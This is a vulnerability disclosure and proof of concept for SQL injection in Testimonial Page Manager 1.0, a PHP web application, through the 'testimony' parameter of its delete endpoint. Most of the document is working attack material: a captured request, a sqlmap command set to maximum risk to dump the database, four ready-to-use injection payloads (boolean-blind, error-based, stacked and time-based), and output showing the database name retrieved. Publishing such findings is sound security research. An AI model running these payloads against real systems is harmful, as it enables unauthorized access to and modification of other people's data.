# Testimonial Page Manager - SQL Injection
+ *Exploit Title:* Testimonial Page Manager - SQL Injection
+ *Date:* 2024-30-01
+ *Exploit Author:* Tuba Kavgacı
+ *Vendor Homepage:* https://www.sourcecodester.com/php/17141/testimonial-page-manager-using-php-and-mysql-source-code.html
+ *Software Link:* https://www.sourcecodester.com/download-code?nid=17141&title=Testimonial+Page+Manager+Using+PHP+and+MySQL+with+Source+Code
+ *Version:* 1.0
+ *Tested on:* Windows 11 Home + PHP 8.2.12, Apache 2.4.58
+ *CVE:* Reported, Waiting for CVE number

## References: 
+ https://portswigger.net/web-security/sql-injection

## Description:
Testimonial Page Manager App 1.0, allows SQL Injection via the 'testimony' parameter in /testimonial-page-manager/endpoint/delete-testimony.php?testimony=2. Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: http://localhost/testimonial-page-manager
+ Select any testimonial and press the delete-testimonial button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /testimonial-page-manager/endpoint/delete-testimony.php?testimony=2 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```
+ Use sqlmap to exploit. In sqlmap, use 'testimony' parameter to dump the database.
```
python sqlmap.py -r r.txt -p testimony --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: testimony (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: testimony=2' RLIKE (SELECT (CASE WHEN (9194=9194) THEN 2 ELSE 0x28 END))-- KweN

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: testimony=2' AND EXTRACTVALUE(4958,CONCAT(0x5c,0x716a6a6b71,(SELECT (ELT(4958=4958,1))),0x716a627871))-- DPLG

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: testimony=2';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: testimony=2' AND (SELECT 6810 FROM (SELECT(SLEEP(5)))XunP)-- DRMW
---
[10:21:39] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[10:21:39] [INFO] fetching current database
[10:21:39] [INFO] retrieved: 'testimonial_db'
current database: 'testimonial_db'
```
+ current database : `testimonial_db`

![Ekran görüntüsü 2024-01-30 183158](https://github.com/tubakvgc/CVE/assets/74067343/5fd5c3e6-4020-47a2-95f2-cfb631bb357e)


  


  
